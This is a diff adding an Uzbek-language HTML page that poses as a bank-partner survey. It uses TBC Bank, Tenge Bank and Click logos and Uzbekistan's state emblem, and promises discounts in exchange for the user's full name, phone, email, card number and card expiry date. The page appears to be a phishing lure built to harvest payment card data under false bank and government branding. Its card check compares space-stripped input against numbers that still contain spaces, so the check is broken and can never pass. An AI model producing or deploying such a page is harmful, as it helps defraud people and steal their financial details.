@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>So'rovnoma | TBC, Tenge, Click</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css">
+    <style>
+        /* Pastdagi bank logotiplari uchun animatsiya */
+        .logos-container {
+            display: flex;
+            align-items: center;
+            justify-content: start;
+            overflow: hidden;
+            white-space: nowrap;
+            background-color: #f8f9fa;
+            padding: 10px 0;
+        }
+
+        .logos-container img {
+            height: 50px;
+            margin: 0 20px;
+            animation: scroll 10s linear infinite;
+        }
+
+        @keyframes scroll {
+            0% {
+                transform: translateX(100%);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+
+        .error-message {
+            color: red;
+            font-weight: bold;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <header class="bg-primary text-white text-center py-3 d-flex justify-content-center align-items-center">
+        <div class="d-flex flex-column align-items-center">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/77/Emblem_of_Uzbekistan.svg/640px-Emblem_of_Uzbekistan.svg.png" alt="O'zbekiston Gerbi" style="height: 50px;">
+            <h1>Bank Hamkorlari bilan Yangi Imkoniyatlar</h1>
+            <p>TBC Bank, Tenge Bank, va Click bilan xizmatlaringizni kengaytiring!</p>
+        </div>
+    </header>
+  
+    
+    <div class="logos-container">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS09EhWhrtm6yjJof2Amb7jPnSOfvHI8TyElA&s" alt="TBC Bank">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHTxr42A1KJiBUUbAO7r8cN2hBi7_AMUBC5w&s" alt="Tenge Bank">
+        <img src="https://kafil.uz/public/storage/clients/March2023/R6sgrhFWOj3tPfeEm2TJ.jpg" alt="Click">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS09EhWhrtm6yjJof2Amb7jPnSOfvHI8TyElA&s" alt="TBC Bank">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHTxr42A1KJiBUUbAO7r8cN2hBi7_AMUBC5w&s" alt="Tenge Bank">
+        <img src="https://kafil.uz/public/storage/clients/March2023/R6sgrhFWOj3tPfeEm2TJ.jpg" alt="Click">
+    </div>
+    
+    <div class="container mt-5">
+        <div class="card shadow-lg border-0 p-4 mb-4 rounded-3">
+            <h2 class="text-center mb-4">So'rovnoma</h2>
+            <p class="text-center text-muted mb-4">
+                Pullarni omonat kassada ko'paytirib, kasalxona, sayohat, va pullik kurslarga chegirmalar oling!
+            </p>
+            <form action="#" method="POST" class="p-3" onsubmit="return validateForm()">
+                <div class="mb-3">
+                    <label for="fullName" class="form-label">F.I.Sh</label>
+                    <input type="text" id="fullName" name="fullName" class="form-control form-control-lg" placeholder="Ism Familiya" required>
+                </div>
+                <div class="mb-3">
+                    <label for="phone" class="form-label">Telefon Raqami</label>
+                    <input type="tel" id="phone" name="phone" class="form-control form-control-lg" placeholder="+998901234567" required>
+                </div>
+                <div class="mb-3">
+                    <label for="email" class="form-label">Email</label>
+                    <input type="email" id="email" name="email" class="form-control form-control-lg" placeholder="example@mail.com" required>
+                </div>
+                <div class="mb-3">
+                    <label for="cardNumber" class="form-label">Karta Raqami</label>
+                    <input type="text" id="cardNumber" name="cardNumber" class="form-control form-control-lg" placeholder="XXXX XXXX XXXX XXXX" required>
+                </div>
+                <div class="mb-3">
+                    <label for="expiryDate" class="form-label">Muddati (MM/YY)</label>
+                    <input type="text" id="expiryDate" name="expiryDate" class="form-control form-control-lg" placeholder="MM/YY" required>
+                </div>
+                <div class="mb-3">
+                    <label for="service" class="form-label">Qaysi xizmatdan foydalanmoqchisiz?</label>
+                    <select id="service" name="service" class="form-select form-select-lg" required>
+                        <option value="" disabled selected>Xizmatni tanlang</option>
+                        <option value="hospital">Kasalxona chegirmalari</option>
+                        <option value="travel">Sayohat xizmatlari</option>
+                        <option value="courses">Pullik o'quv kurslari</option>
+                    </select>
+                </div>
+                <button type="submit" class="btn btn-primary w-100 btn-lg">So'rov yuborish</button>
+                <div id="errorMessage" class="error-message mt-3">Karta ma'lumotlari noto'g'ri yoki topilmadi!</div>
+            </form>
+        </div>
+    </div>
+    
+    
+    <!-- Pastdagi bank logotiplari animatsiyasi -->
+    <div class="logos-container">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS09EhWhrtm6yjJof2Amb7jPnSOfvHI8TyElA&s" alt="TBC Bank">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHTxr42A1KJiBUUbAO7r8cN2hBi7_AMUBC5w&s" alt="Tenge Bank">
+        <img src="https://kafil.uz/public/storage/clients/March2023/R6sgrhFWOj3tPfeEm2TJ.jpg" alt="Click">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS09EhWhrtm6yjJof2Amb7jPnSOfvHI8TyElA&s" alt="TBC Bank">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQHTxr42A1KJiBUUbAO7r8cN2hBi7_AMUBC5w&s" alt="Tenge Bank">
+        <img src="https://kafil.uz/public/storage/clients/March2023/R6sgrhFWOj3tPfeEm2TJ.jpg" alt="Click">
+    </div>
+
+    <footer class="bg-dark text-white text-center py-2">
+        <p>&copy; 2024 Hamkor Banklar. Barcha huquqlar himoyalangan.</p>
+    </footer>
+
+    <script>
+        // Simulated valid card numbers for demonstration
+        const validCardNumbers = [
+            "1234 5678 9101 1121", // Example valid card
+            "2345 6789 1011 2233"
+        ];
+
+        function validateForm() {
+            const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+            const errorMessage = document.getElementById('errorMessage');
+            
+            if (!validCardNumbers.includes(cardNumber)) {
+                errorMessage.style.display = 'block';
+                return false; // Prevent form submission
+            }
+
+            errorMessage.style.display = 'none'; // Hide error if card is valid
+            return true; // Proceed with form submission
+        }
+    </script>
+</body>
+</html>
